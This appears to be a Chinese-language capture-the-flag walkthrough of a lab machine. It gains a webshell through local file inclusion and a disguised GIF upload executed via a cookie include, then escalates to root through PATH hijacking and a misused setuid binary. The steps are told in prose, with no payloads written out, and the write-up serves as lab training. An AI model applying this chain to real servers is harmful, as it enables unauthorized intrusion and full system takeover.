上传模块需要登录, 那登录考虑存在sql注入万能密码, 试一下,这里用sqlmap迅速试了一下发现不行, 说明不存在注入.
不过一个参数看起来挺有意思, 就是那个page参数.
试试能不能利用本地文件包含做点事情, 常规的尝试发现不行, 这里是我没接触过得一个知识点:
interesting-local-file-inclusion-method


读出了东西, 应该是源代码, 我们解密一下, base64.

bingo,看一下源码, 注意到一个有意思的地方, 如果cookie值为’lang’,会include到一个文件里. 猜测后面会用到

看nikto的扫描结果, 说config.php源代码里面有数据库的账号密码, 那我们读取一下

果然有, 连接一下看看

解密一下:

尝试传webshell, 这里看一下上传处的源码

看一下过滤条件

  1. 限制了文件类型
  2. 限制了文件扩展
  3. md5加密了文件路径
  4. 不能多个后缀

    修改了这三个地方上传, 结果上传成功了,返回了路径
    upload/3208fd203ca8fdfa13bc98a4832c1396.gif
    那么问题来了我们只上传了一个带php代码的gif, 现在没办法执行它, 这里开始在浏览index的源代码的时候发现, cookie中可以携带一个lang, 会调用这个lang的值, 所以我们尝试把shell的路径作为lang的值, 访问以下.


    bingo 现在我们获得了一个shell
    看一下home

尝试用数据库中的账号登录,查看home目录权限
切换用户, 可以登录kane并访问其目录下的文件

尝试运行./msgmike时. 提示cat: /home/mike/msg.txt不存在, 看一下文件的权限

是用户mike创建的一个文件, 调用了cat访问msg.txt, 我们进入/tmp目录并创建cat文件, 写入/bin/sh, 在PATH里面加入.
这样我们访问msgmike的时候就会调用当前目录下的cat文件并且执行文件的时候可以不用./文件名, 由此可以获得mike权限的bash

进入mike的home

这里发现root用户的文件, 文件内容调用了/bin/echo把输入的字符带存在messages.txt里, 我们可以利用他调用/bin/bash获取root的bash

成功, 如果是/bin/bash 需要加一个-p

-p打开 privileged mode (特权模式)。 在这个模式中，不会处理 $ENV 和 $BASH_ENV 文件，shell 函数不会从环境中继承，环境中如果有变量 SHELLOPTS， 也将被忽略。如果 shell 启动时的有效用户(组) ID 与真实用户(组) ID 不同，并且没有给出 -p 选项，将执行这些操作，有效用户 ID 将设置为真实用户 ID。如果启动是给出了 -p 选项，有效用户 ID 不会被重置。将这个选项关闭使得有效用户和组 ID 被设置为真实用户和组 ID。
